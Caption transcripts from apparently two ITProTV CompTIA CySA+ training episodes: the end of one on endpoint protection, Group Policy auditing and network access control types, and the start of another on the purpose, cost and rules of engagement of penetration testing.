protection.\n\n474\n00:25:23.090 --> 00:25:24.270\nThings of that nature.\n\n475\n00:25:24.270 --> 00:25:25.750\nSo these are the Symantec's of the world.\n\n476\n00:25:25.750 --> 00:25:27.030\nThis is the Kaspersky's of the world.\n\n477\n00:25:27.030 --> 00:25:30.410\nThis is the McAfee's of the world and\nAVG, you name it.\n\n478\n00:25:30.410 --> 00:25:35.160\nThey all typically have an enterprise\nlevel environment that lets you\n\n479\n00:25:35.160 --> 00:25:37.150\nHave centralized management\nto all of your clients.\n\n480\n00:25:37.150 --> 00:25:38.730\nYour clients have client\nsoftware installed.\n\n481\n00:25:38.730 --> 00:25:43.490\nThey do things like firewalling,\nthey do intrusion detection prevention.\n\n482\n00:25:43.490 --> 00:25:46.640\nThey do antivirus, antimalware.\n\n483\n00:25:46.640 --> 00:25:47.608\nWhat else do they do?\n\n484\n00:25:47.608 --> 00:25:52.315\nThat's about it, they'll report back so\nwith that centralized office we'll do\n\n485\n00:25:52.315 --> 00:25:54.775\nthings like reporting\nback their health status.\n\n486\n00:25:54.775 --> 00:25:57.555\nAre their definitions up to date,\nyou wanna make sure that they\n\n487\n00:25:57.555 --> 00:26:01.465\nare doing definition updates if you\nare running endpoint protection, so\n\n488\n00:26:01.465 --> 00:26:04.515\nvery important thing because if\nyou get out of date with endpoint,\n\n489\n00:26:04.515 --> 00:26:07.835\nsignatures then new\nsignatures will slide by.\n\n490\n00:26:07.835 --> 00:26:09.540\nSo you always wanna make sure you update.\n\n491\n00:26:09.540 --> 00:26:14.480\nA lot of them will update at least\ntwice a day, if not just at least once.\n\n492\n00:26:14.480 --> 00:26:18.220\nBut twice is even better because\nnew threats are found all the time.\n\n493\n00:26:18.220 --> 00:26:23.270\nAnd making sure that those are enabled and\nready to go is always a good idea.\n\n494\n00:26:24.520 --> 00:26:26.070\nThat's basically it.\n\n495\n00:26:26.070 --> 00:26:27.230\nYou install some software.\n\n496\n00:26:27.230 --> 00:26:28.050\nYou get the management going.\n\n497\n00:26:28.050 --> 00:26:29.870\nYou make sure connections are happening.\n\n498\n00:26:29.870 --> 00:26:32.200\nAnd voila, you can keep an eye on it.\n\n499\n00:26:32.200 --> 00:26:36.690\nSet up alerts, usually through email,\nor maybe text messages to your phone, or\n\n500\n00:26:36.690 --> 00:26:40.810\nyour mobile device, whatever you're using,\nso that you know if anything does happen.\n\n501\n00:26:40.810 --> 00:26:44.940\nA lot of times, a cool thing that will\nhappen with the client itself, it\n\n502\n00:26:44.940 --> 00:26:48.700\nwill actually alert the user if something\nis happening through the IDS IPS.\n\n503\n00:26:48.700 --> 00:26:52.050\nIt will say, hey, blocked action such and\nsuch from running.\n\n504\n00:26:52.050 --> 00:26:53.560\nContact your administrator.\n\n505\n00:26:53.560 --> 00:26:55.350\nAnd you'll also get an email for that.\n\n506\n00:26:55.350 --> 00:26:58.750\nBut if you don't see that in a timely\nmanner, maybe the user will contact you.\n\n507\n00:26:58.750 --> 00:26:59.460\nAnd say, hey,\n\n508\n00:26:59.460 --> 00:27:02.860\nI just got a weird pop-up that said\nit was blocking some sort of action.\n\n509\n00:27:02.860 --> 00:27:03.470\nThere was a threat.\n\n510\n00:27:03.470 --> 00:27:06.020\nThat it's quarantined things.\n\n511\n00:27:06.020 --> 00:27:06.880\nAre you aware of this?\n\n512\n00:27:06.880 --> 00:27:09.560\nAnd you can say yes or\nno and remediate from there.\n\n513\n00:27:09.560 --> 00:27:10.060\nVery cool stuff.\n\n514\n00:27:11.330 --> 00:27:14.570\nAnother way inside of a Windows\nsystem is through group policy.\n\n515\n00:27:14.570 --> 00:27:18.480\nGroup policy is a good way\nto set up security for\n\n516\n00:27:18.480 --> 00:27:23.560\nyour entire enterprise level environment,\nfrom one centralized spot.\n\n517\n00:27:23.560 --> 00:27:27.132\nYou should be getting familiar\nwith the term centralized\n\n518\n00:27:27.132 --> 00:27:27.680\nmanagement.\n&gt;&gt; [LAUGH]\n\n519\n00:27:27.680 --> 00:27:28.860\n&gt;&gt; Cuz that's what we like,\n\n520\n00:27:28.860 --> 00:27:29.480\nthat's what we need.\n\n521\n00:27:29.480 --> 00:27:31.840\nI can't go to every computer and set this.\n\n522\n00:27:31.840 --> 00:27:34.850\nEvery computer has local security policy.\n\n523\n00:27:34.850 --> 00:27:37.770\nBut that would be a nightmare for me to\nlog into everyone of these things and\n\n524\n00:27:37.770 --> 00:27:38.580\nset this up.\n\n525\n00:27:38.580 --> 00:27:43.926\nWith group policy I can just any domain\njoin machine say here's what your local\n\n526\n00:27:43.926 --> 00:27:48.948\nsecurity policy should be, and\nI actually got practice labs up here, and\n\n527\n00:27:48.948 --> 00:27:54.556\nI've got a Windows service just to show\nyou basically where to do with this thing.\n\n528\n00:27:54.556 --> 00:27:56.830\nLet me go here.\n\n529\n00:27:56.830 --> 00:28:00.760\nAnd we're gonna say, scroll down.\n\n530\n00:28:00.760 --> 00:28:05.730\nThere we go.\nDo a search for group policy management.\n\n531\n00:28:05.730 --> 00:28:07.890\nAnd just bring up the group\npolicy management.\n\n532\n00:28:07.890 --> 00:28:09.440\nHere's my forest.\n\n533\n00:28:09.440 --> 00:28:11.060\nI can go into the domains.\n\n534\n00:28:12.310 --> 00:28:14.600\nThere it is for practice labs.\n\n535\n00:28:14.600 --> 00:28:15.290\nAnd what I can do.\n\n536\n00:28:15.290 --> 00:28:18.650\nThis is just a ton of security options.\n\n537\n00:28:18.650 --> 00:28:22.410\nAnd just computer settings,\nsecurity settings, user settings.\n\n538\n00:28:22.410 --> 00:28:24.410\nLot of cool stuff in here.\n\n539\n00:28:24.410 --> 00:28:25.230\nLet's see here.\n\n540\n00:28:25.230 --> 00:28:27.880\nWe wanna look at\nthe default domain process.\n\n541\n00:28:27.880 --> 00:28:29.998\nYou can create new\ndefault domain policies.\n\n542\n00:28:29.998 --> 00:28:33.710\n[INAUDIBLE] thank you.\n\n543\n00:28:33.710 --> 00:28:37.930\nOr you can edit the main policy, if I\ncan right-click, there we go, hit Edit,\n\n544\n00:28:37.930 --> 00:28:42.250\nwhich will bring up the Group Policy\nManagement Editor, there we go.\n\n545\n00:28:42.250 --> 00:28:45.760\nAnd in here,\nyou have Computer Configuration.\n\n546\n00:28:45.760 --> 00:28:48.370\nI'm sure this is probably\na little small for you guys.\n\n547\n00:28:48.370 --> 00:28:52.110\nComputer Configuration,\nUser Configuration.\n\n548\n00:28:52.110 --> 00:28:53.340\nSo if you wanna configure something for\n\n549\n00:28:53.340 --> 00:28:56.410\nthe computer,\nlet's go into the policies there.\n\n550\n00:28:56.410 --> 00:29:01.020\nWe have Windows Settings, and\ncome on, you can do it, there we go.\n\n551\n00:29:01.020 --> 00:29:06.700\nWe have Security Settings in there, and\nLocal Policies is always a good one.\n\n552\n00:29:06.700 --> 00:29:09.570\nWhat Local policies,\nI've got audit policies.\n\n553\n00:29:09.570 --> 00:29:13.930\nI can come over here and say Audit account\nlogons, so I can make sure that every one\n\n554\n00:29:13.930 --> 00:29:20.380\nof the computers in my domain is auditing\naccount events, or logon events.\n\n555\n00:29:20.380 --> 00:29:23.080\nWe've got account logon events,\nand logon events.\n\n556\n00:29:23.080 --> 00:29:25.350\nI can never remember which one's which and\nwhat does what.\n\n557\n00:29:25.350 --> 00:29:30.100\nThere is a good Details tab on there,\nand they are very descriptive.\n\n558\n00:29:30.100 --> 00:29:31.350\nThey did a great job with this.\n\n559\n00:29:32.660 --> 00:29:34.465\nWhich I always just turn both of them on.\n\n560\n00:29:34.465 --> 00:29:37.220\n[LAUGH] So\nthis is the kind of thing that I enable.\n\n561\n00:29:37.220 --> 00:29:41.650\nMake sure that you're enforcing things,\nlike, that you're using the latest version\n\n562\n00:29:41.650 --> 00:29:46.440\nof TLS and you never allow using\nSSL because it's insecure now.\n\n563\n00:29:46.440 --> 00:29:47.700\nRight.\nThese are the kinds of things that you can\n\n564\n00:29:47.700 --> 00:29:51.110\nsetup and manage through group policy.\n\n565\n00:29:51.110 --> 00:29:53.650\nIt's a very, very, very, very powerful.\n\n566\n00:29:53.650 --> 00:29:55.590\nFor your security settings.\n\n567\n00:29:55.590 --> 00:29:57.065\nWhat else can we do?\n\n568\n00:29:57.065 --> 00:30:00.980\nOkay we are onto knack and\nthen we have very precious time left.\n\n569\n00:30:00.980 --> 00:30:04.823\nBut the good news is that there is not\na whole lot to talk about when it comes to\n\n570\n00:30:04.823 --> 00:30:07.697\nknack or at least for\nthis show's intensive purposes.\n\n571\n00:30:07.697 --> 00:30:11.110\nWhen it comes to knack\nnetwork access control right?\n\n572\n00:30:11.110 --> 00:30:15.910\nBasically what we're doing is setting up\na system that you can do agent lists or\n\n573\n00:30:15.910 --> 00:30:19.460\nagent based, but it's gonna be this system\n\n574\n00:30:19.460 --> 00:30:21.640\nthat takes a look at anything that\nwants to connect to your network.\n\n575\n00:30:23.040 --> 00:30:27.080\nAnd it says, I've got an idea\nof what you should look like,\n\n576\n00:30:27.080 --> 00:30:28.550\nthat is our security profile.\n\n577\n00:30:29.950 --> 00:30:32.260\nYou must have antivirus,\nit must be up to date,\n\n578\n00:30:32.260 --> 00:30:35.170\nit must have the latest version of this,\nyou might have that.\n\n579\n00:30:35.170 --> 00:30:37.300\nYou set all these things\nin your NAC system.\n\n580\n00:30:37.300 --> 00:30:40.370\nAnd then, when somebody plugs in a cable\nor they connect to the wireless, and\n\n581\n00:30:40.370 --> 00:30:45.150\nthey try to gain access, the Knack System\ncomes into play and says, well,\n\n582\n00:30:45.150 --> 00:30:48.260\nyou don't meet criteria X, Y, or Z.\n\n583\n00:30:48.260 --> 00:30:50.440\nTherefore, I'm not gonna give you access.\n\n584\n00:30:50.440 --> 00:30:53.520\nNow, it might give you access\nto a remediation area.\n\n585\n00:30:53.520 --> 00:30:55.410\nOr it might not give you access, at all.\n\n586\n00:30:55.410 --> 00:30:58.580\nAnd you must remediate your machine\nbefore it gives you access.\n\n587\n00:30:58.580 --> 00:30:59.610\nAnd there's a different,\n\n588\n00:30:59.610 --> 00:31:03.770\nthere's a couple of different types that\nyou might run into, four specifically for\n\n589\n00:31:03.770 --> 00:31:10.210\nour exam, which is time based, rule based,\nrole based, and location based.\n\n590\n00:31:10.210 --> 00:31:11.080\nRight?\nSo time based,\n\n591\n00:31:11.080 --> 00:31:13.430\nrule based, role based,\nand location based.\n\n592\n00:31:13.430 --> 00:31:16.490\nTime.\nWhat time are they allowed to log on?\n\n593\n00:31:16.490 --> 00:31:18.090\nOr gain access to the system.\n\n594\n00:31:19.110 --> 00:31:21.880\nIf it's not during work hours,\nthen you have no means or\n\n595\n00:31:21.880 --> 00:31:24.150\nreason to be trying to gain access.\n\n596\n00:31:24.150 --> 00:31:27.430\nSo if we are a company that works eight to\nfive and there is no after hours work, we\n\n597\n00:31:27.430 --> 00:31:33.560\nshouldn't be seeing any kind of connection\nattempts to our network after those times.\n\n598\n00:31:33.560 --> 00:31:36.130\nSo we make an access that says\nanybody that tries to create\n\n599\n00:31:36.130 --> 00:31:37.900\na connection doesn't happen.\n\n600\n00:31:37.900 --> 00:31:41.490\nTypically, bad actors work at night, or\n\n601\n00:31:41.490 --> 00:31:46.330\nafter hours when somebody would be less\nlikely to notice their activities, right?\n\n602\n00:31:46.330 --> 00:31:49.660\nSo time based might be\nthe way you wanna go.\n\n603\n00:31:49.660 --> 00:31:51.700\nRule based, right?\n\n604\n00:31:51.700 --> 00:31:55.210\nWhat are you allowed to access and\nnot allowed to access,\n\n605\n00:31:55.210 --> 00:31:58.980\nbased off of a Specific\nrule that we creates.\n\n606\n00:31:58.980 --> 00:32:00.960\nSo another way you can set this thing up,\nrole base.\n\n607\n00:32:00.960 --> 00:32:02.270\nWhat is your role in the company?\n\n608\n00:32:04.850 --> 00:32:06.490\nAre you a CEO?\n\n609\n00:32:06.490 --> 00:32:07.590\nAre you a Tech Admin?\n\n610\n00:32:07.590 --> 00:32:09.610\nIT Admin.\nAre you network?\n\n611\n00:32:09.610 --> 00:32:10.600\nAre you infrastructure?\n\n612\n00:32:10.600 --> 00:32:11.740\nAre you HR?\n\n613\n00:32:11.740 --> 00:32:15.918\nWhat do, and based off what\nrole you fill in the company.\n\n614\n00:32:15.918 --> 00:32:22.370\nFor the organization, then you get\naccess to only certain resources.\n\n615\n00:32:22.370 --> 00:32:26.580\nThat idea of network segmentation\nkind of rearing its head here, right.\n\n616\n00:32:26.580 --> 00:32:28.100\nAnd then location based.\n\n617\n00:32:28.100 --> 00:32:29.910\nIf you're at Starbucks,\nyou're not coming in.\n\n618\n00:32:29.910 --> 00:32:31.140\nIt's just not gonna happen.\n\n619\n00:32:31.140 --> 00:32:32.310\nNot going to allow it.\n\n620\n00:32:32.310 --> 00:32:33.380\nI don't care.\n\n621\n00:32:33.380 --> 00:32:36.520\nNow if you create a VPN,\nmaybe that's a different story.\n\n622\n00:32:36.520 --> 00:32:39.010\nRight, but\nthe location could be very important.\n\n623\n00:32:39.010 --> 00:32:40.690\nIf you're in the lobby and\n\n624\n00:32:40.690 --> 00:32:44.730\nyou're trying to gain access to HR,\nthat's not how this works.\n\n625\n00:32:44.730 --> 00:32:49.330\nYour location has defined a set\nof rules that say, no access.\n\n626\n00:32:49.330 --> 00:32:53.020\nAnd the nac does this for us, it's a bit\nmore complex working with Kerberos and\n\n627\n00:32:53.020 --> 00:32:55.620\ntickets and\nall the lovely thing that goes on with it.\n\n628\n00:32:55.620 --> 00:32:59.240\nBut for right now we still know\nthe different types of nacs that we might\n\n629\n00:32:59.240 --> 00:33:03.250\nencounter in the wild and that we could\nemploy inside of our environments.\n\n630\n00:33:03.250 --> 00:33:07.992\nWell Ronnie I think that's all we need\nto know right now about Mac systems and\n\n631\n00:33:07.992 --> 00:33:11.621\n[SOUND] I think we're covered.\n&gt;&gt; [LAUGH] All right Daniel thank you for\n\n632\n00:33:11.621 --> 00:33:15.114\nleading us through this idea of system\nhardening as well as understanding\n\n633\n00:33:15.114 --> 00:33:16.690\nNAC a little bit more.\n\n634\n00:33:16.690 --> 00:33:18.690\nPart of these ideas of counter measures,\nof course,\n\n635\n00:33:18.690 --> 00:33:23.470\nallow us to get a smaller footprint and\nnot be exposed to what hackers,\n\n636\n00:33:23.470 --> 00:33:27.400\nor attackers, I should say,\nare expecting to find.\n\n637\n00:33:27.400 --> 00:33:31.500\nSo we are trying to make sure that we give\nthem as little as possible by closing off\n\n638\n00:33:31.500 --> 00:33:35.600\nwhat we need to through that system\nhardening and then network access control.\n\n639\n00:33:35.600 --> 00:33:37.000\nIt is even more restrictive, and\n\n640\n00:33:37.000 --> 00:33:39.880\nyou'll hear a term as you advance\non in your security career.\n\n641\n00:33:39.880 --> 00:33:42.300\nWhat we call the idea of\npolicy-based security,\n\n642\n00:33:42.300 --> 00:33:45.400\nand that's what network access\ncontrol is also setting up.\n\n643\n00:33:45.400 --> 00:33:48.500\nBut there is more to come, but\nthat's gonna be for another episode then.\n\n644\n00:33:48.500 --> 00:33:52.510\nSo signing off for IT Pro TV,\nI'm your host Ronnie Wong.\n\n645\n00:33:52.510 --> 00:33:53.340\n&gt;&gt; And I'm Daniel Lowrie.\n\n646\n00:33:53.340 --> 00:33:55.629\n&gt;&gt; Stay tuned right here for\n\n647\n00:33:55.629 --> 00:33:58.574\nmore CompTIA CySA+ episodes.\n\n648\n00:33:58.574 --> 00:34:04.548\n[MUSIC]\n\n649\n00:34:04.548 -->

Good to see you Zach.\n\n10\n00:00:30.340 --> 00:00:31.180\nGlad to be on this show.\n\n11\n00:00:31.180 --> 00:00:33.730\nThanks for joining us everyone,\nand Zach is right today.\n\n12\n00:00:33.730 --> 00:00:36.340\nWe're going to talk a little bit\nabout Penetration Testing and\n\n13\n00:00:36.340 --> 00:00:38.750\noddly enough, well at least for me,\n\n14\n00:00:38.750 --> 00:00:41.940\nwhen you're in security you think\neverybody knows about this stuff.\n\n15\n00:00:41.940 --> 00:00:42.720\nBut that's not true.\n\n16\n00:00:42.720 --> 00:00:43.930\nWe're not born with this knowledge\n\n17\n00:00:43.930 --> 00:00:45.150\napparently.\n&gt;&gt; I was.\n\n18\n00:00:45.150 --> 00:00:46.840\n&gt;&gt; I know, well yes he was.\n\n19\n00:00:46.840 --> 00:00:48.990\nHe teaches me everything I need to know.\n\n20\n00:00:48.990 --> 00:00:52.230\n[LAUGH] We have to learn it, so\nif you're here to learn a little bit about\n\n21\n00:00:52.230 --> 00:00:55.840\nPenetration Testing, or you know something\nabout penetration testing you also need to\n\n22\n00:00:55.840 --> 00:01:00.430\nknow then, what do you need to\nknow when it comes to the exam.\n\n23\n00:01:00.430 --> 00:01:02.890\nThat's the important stuff, so that's\nwhat we're gonna try to cover today.\n\n24\n00:01:02.890 --> 00:01:06.493\nI'll give you a good rundown of\nPenetration Testing which is enough for\n\n25\n00:01:06.493 --> 00:01:10.360\nthe exam, and just some interesting\nlittle tidbits about that process.\n\n26\n00:01:10.360 --> 00:01:11.540\n&gt;&gt; Speaking of tidbits,\n\n27\n00:01:11.540 --> 00:01:13.370\nwhat is the purpose of a pen test?\n\n28\n00:01:13.370 --> 00:01:14.490\nThat's a great question.\n\n29\n00:01:14.490 --> 00:01:15.750\nIt's a really good place to start off.\n\n30\n00:01:15.750 --> 00:01:17.690\nIt's almost akin to what is it.\n\n31\n00:01:17.690 --> 00:01:21.932\nThe purpose and\nwhat it is kind of their married together.\n\n32\n00:01:21.932 --> 00:01:24.970\nYou're gonna get the same answer just\nabout for both of those questions.\n\n33\n00:01:24.970 --> 00:01:26.440\nSo, what is the purpose of it?\n\n34\n00:01:26.440 --> 00:01:28.340\nWhat is it?\nWhat are we doing when we are talking\n\n35\n00:01:28.340 --> 00:01:30.070\nabout Pen Test or Penetration testing?\n\n36\n00:01:30.070 --> 00:01:33.590\nWhat we're talking about\nis you have a network.\n\n37\n00:01:33.590 --> 00:01:34.910\nThere are computers on there,\n\n38\n00:01:34.910 --> 00:01:40.040\nthere are servers on there, there's\nother equipment that's connected to it.\n\n39\n00:01:40.040 --> 00:01:43.840\nAnd there are bad guys out in the world,\nor bad girls as they might be, and\n\n40\n00:01:43.840 --> 00:01:46.050\nthey want to gain access to these things.\n\n41\n00:01:46.050 --> 00:01:46.840\nWhat do they do?\n\n42\n00:01:46.840 --> 00:01:49.330\nWell, they have a strategy and\n\n43\n00:01:49.330 --> 00:01:53.790\na means by which they attempt to\ngain that unauthorized access.\n\n44\n00:01:53.790 --> 00:01:58.540\nWell that's bad for us, so what we want to\ndo is kind of like think like they think,\n\n45\n00:01:58.540 --> 00:02:03.560\nact like they act,\ncome at your network as if you were\n\n46\n00:02:03.560 --> 00:02:08.730\na threat actor and see, using their same\nmethodology, where your weak spots are.\n\n47\n00:02:08.730 --> 00:02:13.160\nIt's basically all about finding your\nweak spots, your vulnerabilities so\n\n48\n00:02:13.160 --> 00:02:17.620\nthat you can mitigate that and fix any\nkind of problems that could come into play\n\n49\n00:02:17.620 --> 00:02:22.160\nbefore those bad actors get in and\nstart going, you know what,\n\n50\n00:02:22.160 --> 00:02:24.980\nthat looks like an interesting network,\nmaybe I'll start looking at them.\n\n51\n00:02:24.980 --> 00:02:28.670\nSo that's the purpose of it.\n&gt;&gt; So a pen test is basically\n\n52\n00:02:28.670 --> 00:02:31.820\nan artificial attack.\n&gt;&gt; I like the you put that,\n\n53\n00:02:31.820 --> 00:02:33.410\nthat's a very good way to put it.\n\n54\n00:02:33.410 --> 00:02:38.920\nIt's a simulator, an artificial look\nat well, I'm not really an attacker.\n\n55\n00:02:38.920 --> 00:02:43.470\nBut I'm acting like one, so\nthat I could see what they might see.\n\n56\n00:02:43.470 --> 00:02:47.480\nAnd where all my weak spots lie,\nwe got to vet those out.\n\n57\n00:02:47.480 --> 00:02:49.370\nThat's one reason we\nwould want to do this.\n\n58\n00:02:49.370 --> 00:02:54.790\nThe other reason is,\nif you're in some sort of business\n\n59\n00:02:54.790 --> 00:03:00.090\nthat is regulatory, or compliance based,\nyou want to make sure that\n\n60\n00:03:00.090 --> 00:03:05.510\nthe things you are doing to sure-up in\nsecurity wise are actually effective.\n\n61\n00:03:05.510 --> 00:03:11.800\nSo if we are meant to be doing\ncode review, is that effective?\n\n62\n00:03:11.800 --> 00:03:13.240\nIs that being done?\n\n63\n00:03:13.240 --> 00:03:14.470\nSo doing a penetration test,\n\n64\n00:03:14.470 --> 00:03:18.760\nif we're blocking all unused ports,\nis that actually happening?\n\n65\n00:03:18.760 --> 00:03:22.000\nSo you're confirming that the security\nmeasures that you're putting in place\n\n66\n00:03:22.000 --> 00:03:23.540\nare actually in place.\n\n67\n00:03:23.540 --> 00:03:29.310\nBecause it's one thing to say, yeah,\nwe block all the ports, okay, prove it.\n\n68\n00:03:29.310 --> 00:03:30.520\nHow do you prove that?\n\n69\n00:03:30.520 --> 00:03:32.880\nA penetration test is a great\nway to prove these things.\n\n70\n00:03:32.880 --> 00:03:34.410\n&gt;&gt; So then we can go to our clients,\n\n71\n00:03:34.410 --> 00:03:36.796\nour outside clients instead\nof our enterprise and\n\n72\n00:03:36.796 --> 00:03:40.598\nsay look, we've done this, here's proof\nthat we have done this to ensure your\n\n73\n00:03:40.598 --> 00:03:43.320\nsafety and security.\n&gt;&gt; Exactly, it's funny when this kind of\n\n74\n00:03:43.320 --> 00:03:46.570\nthing will pop up if you're looking for\nan investment capital.\n\n75\n00:03:46.570 --> 00:03:49.340\nInvestors will want to see well when was\nthe last time you've done a penetration\n\n76\n00:03:49.340 --> 00:03:52.780\ntest, so we can see verify that\nyour company is actually secure.\n\n77\n00:03:52.780 --> 00:03:55.790\nI need something tangible I can\nstick in my hand and look and\n\n78\n00:03:55.790 --> 00:03:58.890\nsee that you're not just\ngiving me lip service, but\n\n79\n00:03:58.890 --> 00:04:02.640\nyou're following through with the security\nmeasures in which you say that you are so\n\n80\n00:04:02.640 --> 00:04:06.760\nthat when I invest my money into this\ncompany I know it's not going to just get\n\n81\n00:04:06.760 --> 00:04:09.470\na big giant data breach and\nhave my name written all over it.\n\n82\n00:04:09.470 --> 00:04:10.280\nThat would be bad.\n\n83\n00:04:10.280 --> 00:04:14.000\nI don't want to invest in that, so I\nappreciate having something I can look at\n\n84\n00:04:14.000 --> 00:04:17.470\nand see and verify you guys\nare doing what you say you're doing.\n\n85\n00:04:17.470 --> 00:04:19.604\n&gt;&gt; So this pen test, this is internal and\n\n86\n00:04:19.604 --> 00:04:22.180\nexternal, or is it both?\n&gt;&gt; Another\n\n87\n00:04:22.180 --> 00:04:24.720\none of the eternal questions.\n&gt;&gt; [LAUGH]\n\n88\n00:04:24.720 --> 00:04:26.840\n&gt;&gt; Right, yeah, what do we do.\n\n89\n00:04:26.840 --> 00:04:27.850\nDo we do an internal test?\n\n90\n00:04:27.850 --> 00:04:28.940\nDo we do an external test?\n\n91\n00:04:28.940 --> 00:04:30.180\nDo we do both?\n\n92\n00:04:30.180 --> 00:04:34.220\nIt really all boils down to what do\nyou have the funds to accomplish?\n\n93\n00:04:34.220 --> 00:04:38.960\nBoth is what you want to do.\n&gt;&gt; Optimal.\n\n94\n00:04:38.960 --> 00:04:40.040\n&gt;&gt; Yeah, it's optimal.\n\n95\n00:04:40.040 --> 00:04:41.730\nThat's where you want to shoot for.\n\n96\n00:04:41.730 --> 00:04:45.651\nIf external tests can be expensive, right?\n\n97\n00:04:45.651 --> 00:04:50.093\nAnd internal tests can also be expensive\nin the way that you might have to\n\n98\n00:04:50.093 --> 00:04:53.650\ninvest in your people to\ngetting them schooled up.\n\n99\n00:04:53.650 --> 00:04:58.140\nSo that they are knowledgeable enough and\nskilled enough to perform the test.\n\n100\n00:04:58.140 --> 00:05:00.090\nSo that can cause a cost as well.\n\n101\n00:05:00.090 --> 00:05:00.760\nExternal tests though,\n\n102\n00:05:00.760 --> 00:05:05.190\nthey tend to be quite expensive depending\non the level of testing that you get done.\n\n103\n00:05:05.190 --> 00:05:10.130\nBut typically within tens of thousands of\ndollars for a week or two, or three or\n\n104\n00:05:10.130 --> 00:05:11.130\nfour of work.\n\n105\n00:05:11.130 --> 00:05:14.700\nSo it can be a bit pricey, but if you can\nget away with it, if you have the ability,\n\n106\n00:05:14.700 --> 00:05:18.550\nthe wherewithal, as they like to say,\nto get that done, you should definitely\n\n107\n00:05:18.550 --> 00:05:21.490\ninvest in doing that.\n&gt;&gt; Are there guidelines for\n\n108\n00:05:21.490 --> 00:05:23.530\nconducting a pen test?\n&gt;&gt; Yes.\n\n109\n00:05:23.530 --> 00:05:24.590\n&gt;&gt; Rules guidelines.\n\n110\n00:05:24.590 --> 00:05:26.140\n&gt;&gt; Yeah, that's a great question.\n\n111\n00:05:27.150 --> 00:05:28.010\nLet's talk about that.\n\n112\n00:05:28.010 --> 00:05:30.916\nLet's bring the elephant in the room.\n&gt;&gt; [SOUND] [LAUGH]\n\n113\n00:05:30.916 --> 00:05:31.820\n&gt;&gt; There he is.\n\n114\n00:05:31.820 --> 00:05:33.490\nHe's back, as always.\n\n115\n00:05:34.510 --> 00:05:37.010\nDo I have to do x, do I have to do y?\n\n116\n00:05:37.010 --> 00:05:42.880\nWhat guides me through the performing\nof the penetration text?\n\n117\n00:05:42.880 --> 00:05:47.050\nAre there any hard and\nfast rules that we want to follow?\n\n118\n00:05:47.050 --> 00:05:49.920\nThere are some industry\n\n119\n00:05:49.920 --> 00:05:53.610\nagreed upon standards is\nthe best way to put it I think.\n\n120\n00:05:53.610 --> 00:05:56.543\nI don't think that I know of is like.\n\n121\n00:05:56.543 --> 00:06:00.414\nIf you have a company that does security,\nand they have here is how you perform\n\n122\n00:06:00.414 --> 00:06:03.360\na pen test then those are your hard and\nfast rules.\n\n123\n00:06:03.360 --> 00:06:07.530\nBut, they can be completely arbitrary\nwhen they are created for that company.\n\n124\n00:06:07.530 --> 00:06:09.490\nThat just becomes your workflow.\n\n125\n00:06:09.490 --> 00:06:10.960\nAnd you have to follow that workflow\n\n126\n00:06:10.960 --> 00:06:12.980\nbecause that's what's\nbeen dictated to you.\n\n127\n00:06:12.980 --> 00:06:18.780\nAs far as this is an objective truth\nthat you must follow x, y and z rules,\n\n128\n00:06:18.780 --> 00:06:24.130\nI don't see that anywhere in reality, we\njust have a very agreed upon idea of what\n\n129\n00:06:24.130 --> 00:06:28.870\na good penetration test would look like,\nand everybody just adheres to that for\n\n130\n00:06:28.870 --> 00:06:30.630\nthe security community.\n&gt;&gt; So\n\n131\n00:06:30.630 --> 00:06:33.498\nlike every company or every enterprise\nwould have their own best practice?\n\n132\n00:06:33.498 --> 00:06:34.180\n&gt;&gt; Yeah, yeah,\n\n133\n00:06:34.180 --> 00:06:39.190\nand again that can come from the community\nat large and build upon that.\n\n134\n00:06:39.190 --> 00:06:42.020\nYou gotta remember every company is\ndifferent so some things are gonna apply\n\n135\n00:06:42.020 --> 00:06:46.340\nwhen other things don't, depending on\nwhere you're at and what you're doing.\n\n136\n00:06:46.340 --> 00:06:49.370\nSo if you work for\na company that does penetration testing.\n\n137\n00:06:49.370 --> 00:06:54.590\nThat is going to kind of a little bit\nas you bought from company to company.\n\n138\n00:06:54.590 --> 00:06:55.870\nSo just got to keep that in mind.\n\n139\n00:06:55.870 --> 00:06:58.790\nBut there are some basic rules\nin which you want to follow.\n\n140\n00:06:58.790 --> 00:07:03.050\nSome guidelines to help you\nget at least a good broad idea\n\n141\n00:07:03.050 --> 00:07:05.200\nof what is involved in a penetration test.\n\n142\n00:07:05.200 --> 00:07:06.760\nSo let's, let's take a look at those.\n\n143\n00:07:06.760 --> 00:07:08.250\nGive you that broad brush.\n\n144\n00:07:08.250 --> 00:07:09.560\nHere's a list I've come up with.\n\n145\n00:07:09.560 --> 00:07:10.500\nPenetration Testing,\n\n146\n00:07:10.500 --> 00:07:12.925\nthe rules of engagement.\n&gt;&gt; Yeah,\n\n147\n00:07:12.925 --> 00:07:14.980\nI know it's a wonderful thing, isn't it?\n\n148\n00:07:14.980 --> 00:07:16.620\nAnd, let's just run through\nthem really quickly.\n\n149\n00:07:16.620 --> 00:07:22.230\nTiming, Scope, Authorization,\nExploitation, Communication and Reporting.\n\n150\n00:07:22.230 --> 00:07:25.460\nSo these are the guys that you want to\nkind of get familiar with and infer\n\n151\n00:07:25.460 --> 00:07:30.120\nthe most part this is what you're gonna\nsee anytime a penetration test is done.\n\n152\n00:07:30.120 --> 00:07:35.780\nBasically, these being our rules of\nengagement that's why rules of engagement.\n\n153\n00:07:35.780 --> 00:07:38.650\nAwesome, yeah, so\nlet's start off with timing.\n\n154\n00:07:38.650 --> 00:07:40.400\nTimings an interesting thing.\n\n155\n00:07:40.400 --> 00:07:45.040\nIt's when do I perform\nthe penetration test, right?\n\n156\n00:07:45.040 --> 00:07:47.560\nYou think,\nwhen they hire me to do it, right?\n\n157\n00:07:47.560 --> 00:07:48.521\n&gt;&gt; In the morning,\n\n158\n00:07:48.521 --> 00:07:49.600\nat 8 o'clock.\n&gt;&gt; Yes.\n\n159\n00:07:49.600 --> 00:07:50.405\n&gt;&gt; Every day.\n\n160\n00:07:50.405 --> 00:07:53.508\n[LAUGH]\n&gt;&gt; See, now that's funny because what if\n\n161\n00:07:53.508 --> 00:07:58.129\nI started a pen test at 8 o'clock\nin the morning, everyday?\n\n162\n00:07:58.129 --> 00:08:01.634\nWell, you've got to remember there's a lot\nof network traffic around 8 o'clock in\n\n163\n00:08:01.634 --> 00:08:02.750\nthe morning.\n&gt;&gt; Mm-hm.\n\n164\n00:08:02.750 --> 00:08:05.075\n&gt;&gt; So performance might be inhibited\n\n165\n00:08:05.075 --> 00:08:09.850\nbecause of, a lot of these tests\ncan be very performance intensive.\n\n166\n00:08:09.850 --> 00:08:13.340\nAll right, they're hammering the network,\nthey're doing things, they're causing\n\n167\n00:08:13.340 --> 00:08:17.550\na lot of traffic, so this might not\nbe the best time of day 